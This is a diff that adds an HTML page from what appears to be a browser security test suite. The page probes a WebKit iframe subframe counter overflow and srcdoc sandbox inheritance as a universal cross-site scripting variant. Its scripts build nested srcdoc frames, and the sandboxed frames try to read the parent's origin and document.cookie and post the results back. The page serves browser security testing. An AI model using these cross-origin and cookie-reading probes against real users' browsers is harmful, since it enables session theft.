@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-SAFARI-02: WebKit iframe Subframe Counter Overflow</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>WebKit iframe Subframe Counter Overflow UXSS</h1>
+    <div class="meta">
+        <span>ID: UXSS-SAFARI-02</span>
+        <span>CVE: Project Zero #2099 / #2100 (variant test)</span>
+        <span>Browsers: Safari, iOS browsers (WebKit)</span>
+        <span>Category: UXSS</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>WebKit has a subframe counter that limits the number of nested iframes. When this
+        counter overflows (e.g., using empty URLs or about:srcdoc), a subframe navigated to
+        <code>about:srcdoc</code> inherits the security context from its parent, which can be
+        a cross-origin page, while content is attacker-controlled.</p>
+        <p>This test creates deeply nested iframe chains and tests whether the security context
+        inheritance breaks down at the overflow boundary.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <button class="btn btn-run" onclick="runTest()">Test Subframe Overflow</button>
+        <button class="btn" onclick="runSrcdocInheritance()">Test srcdoc Security Context Inheritance</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running subframe counter overflow test...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + ' (' + info.engine + ')</div>';
+
+    // Create a deeply nested iframe chain
+    const MAX_DEPTH = 20; // Test various depths
+    let container = document.createElement('div');
+    container.style.display = 'none';
+    document.body.appendChild(container);
+
+    let currentDoc = document;
+    let depth = 0;
+
+    function createNestedFrame(parentEl, currentDepth) {
+        if (currentDepth >= MAX_DEPTH) {
+            output.innerHTML += '<div style="color:#8b949e;">Reached depth ' + currentDepth + '. Testing security context...</div>';
+            checkSecurityContext(parentEl, currentDepth);
+            return;
+        }
+
+        const frame = document.createElement('iframe');
+        frame.srcdoc = '<html><body id="depth-' + currentDepth + '"></body></html>';
+        frame.style.display = 'none';
+        parentEl.appendChild(frame);
+
+        frame.onload = function() {
+            depth = currentDepth;
+            try {
+                const innerDoc = frame.contentDocument;
+                createNestedFrame(innerDoc.body, currentDepth + 1);
+            } catch(e) {
+                output.innerHTML += '<div style="color:#8b949e;">Blocked at depth ' + currentDepth + ': ' + e.message + '</div>';
+                reportResult('output', 'Subframe overflow at depth ' + currentDepth, false, e.message);
+            }
+        };
+    }
+
+    createNestedFrame(container, 0);
+}
+
+function checkSecurityContext(el, depth) {
+    const output = document.getElementById('output');
+    try {
+        // Try to access parent chain
+        let win = el.ownerDocument.defaultView || window;
+        let parentOrigins = [];
+        let current = win;
+        while (current && current !== current.parent) {
+            try {
+                parentOrigins.push(current.location.origin);
+            } catch(e) {
+                parentOrigins.push('BLOCKED');
+            }
+            current = current.parent;
+        }
+        output.innerHTML += '<div style="color:#8b949e;">Parent chain origins: ' + parentOrigins.join(' -> ') + '</div>';
+        output.innerHTML += '<div style="color:#8b949e;">Max depth reached: ' + depth + '</div>';
+    } catch(e) {
+        output.innerHTML += '<div style="color:#8b949e;">Error checking context: ' + e.message + '</div>';
+    }
+    reportResult('output', 'Subframe counter overflow', false,
+        'Reached depth ' + depth + '. Modern WebKit has overflow protections.');
+}
+
+function runSrcdocInheritance() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Testing srcdoc security context inheritance...</div>';
+
+    // Test 1: srcdoc in sandboxed iframe
+    const sandboxedFrame = document.createElement('iframe');
+    sandboxedFrame.sandbox = 'allow-scripts';
+    sandboxedFrame.srcdoc = '<html><body><script>' +
+        'var result = {' +
+        '  origin: location.origin,' +
+        '  baseURI: document.baseURI,' +
+        '  url: location.href,' +
+        '  parentAccessible: false' +
+        '};' +
+        'try { result.parentOrigin = parent.location.origin; result.parentAccessible = true; }' +
+        'catch(e) { result.parentError = e.message; }' +
+        'parent.postMessage({type:"srcdoc-test", data: result}, "*");' +
+        '<\/script></body></html>';
+
+    window.addEventListener('message', function handler(e) {
+        if (e.data && e.data.type === 'srcdoc-test') {
+            const d = e.data.data;
+            output.innerHTML += '<div style="color:#58a6ff;">srcdoc frame reports:</div>';
+            output.innerHTML += '<div style="color:#8b949e;">  origin: ' + d.origin + '</div>';
+            output.innerHTML += '<div style="color:#8b949e;">  baseURI: ' + d.baseURI + '</div>';
+            output.innerHTML += '<div style="color:#8b949e;">  url: ' + d.url + '</div>';
+            output.innerHTML += '<div style="color:#8b949e;">  parent accessible: ' + d.parentAccessible + '</div>';
+
+            if (d.baseURI && d.baseURI !== 'about:srcdoc' && d.baseURI.includes(location.host)) {
+                output.innerHTML += '<div style="color:#d29922;">Note: srcdoc inherits parent baseURI (' +
+                    info.browser + ' behavior). This can leak parent URL info.</div>';
+            }
+
+            if (d.parentAccessible && d.origin === 'null') {
+                output.innerHTML += '<div style="color:#d29922;">Sandboxed srcdoc has null origin but can still message parent.</div>';
+            }
+
+            reportResult('output', 'srcdoc security context', d.parentAccessible && d.origin !== 'null',
+                d.parentAccessible ? 'Parent accessible from srcdoc' : 'Properly sandboxed');
+            window.removeEventListener('message', handler);
+        }
+    });
+
+    document.body.appendChild(sandboxedFrame);
+
+    // Test 2: srcdoc with allow-same-origin
+    setTimeout(function() {
+        const sameOriginFrame = document.createElement('iframe');
+        sameOriginFrame.sandbox = 'allow-scripts allow-same-origin';
+        sameOriginFrame.srcdoc = '<html><body><script>' +
+            'var result = { origin: location.origin, canAccessParent: false };' +
+            'try {' +
+            '  result.parentCookie = parent.document.cookie;' +
+            '  result.canAccessParent = true;' +
+            '} catch(e) { result.error = e.message; }' +
+            'parent.postMessage({type:"srcdoc-sameorigin", data: result}, "*");' +
+            '<\/script></body></html>';
+
+        window.addEventListener('message', function handler2(e) {
+            if (e.data && e.data.type === 'srcdoc-sameorigin') {
+                const d = e.data.data;
+                output.innerHTML += '<div style="color:#58a6ff;">srcdoc (allow-same-origin) reports:</div>';
+                output.innerHTML += '<div style="color:#8b949e;">  origin: ' + d.origin + '</div>';
+                output.innerHTML += '<div style="color:#8b949e;">  can access parent: ' + d.canAccessParent + '</div>';
+                if (d.canAccessParent) {
+                    output.innerHTML += '<div style="color:#d29922;">allow-scripts + allow-same-origin = sandbox escape potential!</div>';
+                }
+                window.removeEventListener('message', handler2);
+            }
+        });
+
+        document.body.appendChild(sameOriginFrame);
+    }, 1000);
+}
+</script>
+</body>
+</html>
